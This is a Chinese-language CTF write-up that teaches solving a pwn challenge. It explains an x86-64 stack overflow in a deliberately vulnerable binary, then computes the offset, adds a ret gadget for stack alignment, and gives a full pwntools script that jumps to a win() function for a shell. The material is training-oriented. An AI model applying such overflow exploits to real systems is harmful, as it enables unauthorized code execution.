### README--做题之前必看

#### 一、思路

```
x86-64 栈溢出
No Canary + No PIE + NX
read(0, buf, 256) 但 buf 只有 64 字节，溢出覆盖返回地址
偏移 = 64(buf) + 8(旧 rbp) = 72
后门函数 win() 内部直接 system("/bin/sh")
跳 win 会因为 rsp 16 字节不对齐导致 system 静默崩溃
栈上插一条 ret gadget 做跳板，对齐后再跳 win
```

保护：No Canary, No PIE, NX enabled, Partial RELRO

#### 二、分析

##### 2.1 查看文件类型和保护机制

```bash
file pwn
checksec pwn
```

<img src="附件\images\README--做题之前必看\Snipaste_2026-10-18_09-34-59.png" alt="Checksec">

- No Canary 可以覆盖返回地址
- No PIE    函数地址固定，可以硬编码
- NX        不能直接放 shellcode，需要 ret2text

##### 2.2 查找后门函数

```bash
nm pwn | grep -i "win\|flag"
# 输出：00000000004011b6 T win
```

找到后门函数 `win`，地址为 `0x4011b6`

##### 2.3 反汇编 main 

```bash
objdump -d pwn | grep -A30 '<main>:'
```

关键汇编

```asm
0x4011ed: sub    $0x40,%rsp          ; 栈分配 0x40 = 64 字节
0x40124a: lea    -0x40(%rbp),%rax    ; buf 地址 = rbp - 0x40
0x40124e: mov    $0x100,%edx         ; read 最多读 0x100 = 256 字节
0x401253: mov    %rax,%rsi           ; rsi = buf
0x401256: mov    $0x0,%edi           ; fd = 0 (stdin)
0x40125b: call   0x4010c0 <read@plt> ; read(0, buf, 256)
```

`read(0, buf, 256)`，但 buf 只有 64 字节，明显栈溢出

##### 2.4 计算偏移

栈布局：

```
高地址
+------------------+
|   返回地址 (8B)   |    rbp + 8
+------------------+
|    旧 rbp (8B)   |    rbp + 0
+------------------+
|                  |
|   buf (64 字节)  |    rbp - 0x40
|                  |
+------------------+
低地址
```

从 buf 开头到返回地址的距离：

```
偏移 = 64 (buf) + 8 (旧 rbp) = 72 字节
```

##### 2.5 分析 win 函数

```bash
objdump -d pwn | grep -A20 '<win>:'
```

反汇编结果：

```asm
0x4011b6: push   %rbp
0x4011bb: mov    %rsp,%rbp
0x4011be: lea    0xe43(%rip),%rdi   ; "Congratulations! You are the best!"
0x4011c5: call   0x401080 <puts@plt>
0x4011ca: lea    0xe5e(%rip),%rdi   ; "system(\"/bin/sh\")"
0x4011d1: call   0x401080 <puts@plt>
0x4011d6: lea    0xe68(%rip),%rdi   ; "/bin/sh"
0x4011dd: call   0x4010a0 <system@plt>
0x4011e4: ret
```

win 函数调用了 `system("/bin/sh")`，跳过去就能拿 shell

##### 2.6 栈对齐

直接构造 `b'A'*72 + p64(win_addr)` 发送后
程序打印了 win 的提示文字，但 shell 没有弹出来，连接直接断开

原因：x86-64 Linux 调用约定规定
调用函数时 rsp 必须是 16 字节对齐
从 main 的 ret 跳转到 win 时，rsp 差了 8 字节
导致 `system` 内部因为栈不对齐而静默崩溃

解决方法：找一个单独的 `ret` 指令作为跳板
先执行一次 ret 把 rsp 调整 8 字节，再跳转到 win

```bash
objdump -d pwn | grep ":.*ret"
# 找到：0x40101a: ret
```

##### 2.7 构造 Exp

Payload :

```
+-------------------+-------------------+-------------------+
|  填充 72 字节 A   |   ret gadget (8B) |   win 地址 (8B)   |
+-------------------+-------------------+-------------------+
```

```python
from pwn import *

# 远程连接
io = remote("ctf.guetsec.cn", 30000) #这里填端口号

# 地址
win_addr   = 0x4011b6   # win函数
ret_gadget = 0x40101a   # 栈对齐
offset     = 72         # 偏移 = 64(buf) + 8(旧的rbp)

# 构造 payload
payload = b'A' * offset + p64(ret_gadget) + p64(win_addr)

# 发送 payload
io.recvuntil(b"payload:")  # 当程序输入payload: 之后再发送payload
io.sendline(payload)

io.interactive()  # 进入交互模式，把终端交给shell
```

运行：

```bash
python3 solve.py
```

进入交互模式后：

```bash
$ ls -a
flag XXX

$ cat flag
GUET{Today_Hope_You_Can_Learn_Kownledge_{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}}
```

#### 三、最终 Flag

```
GUET{Today_Hope_You_Can_Learn_Kownledge_{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}}
```
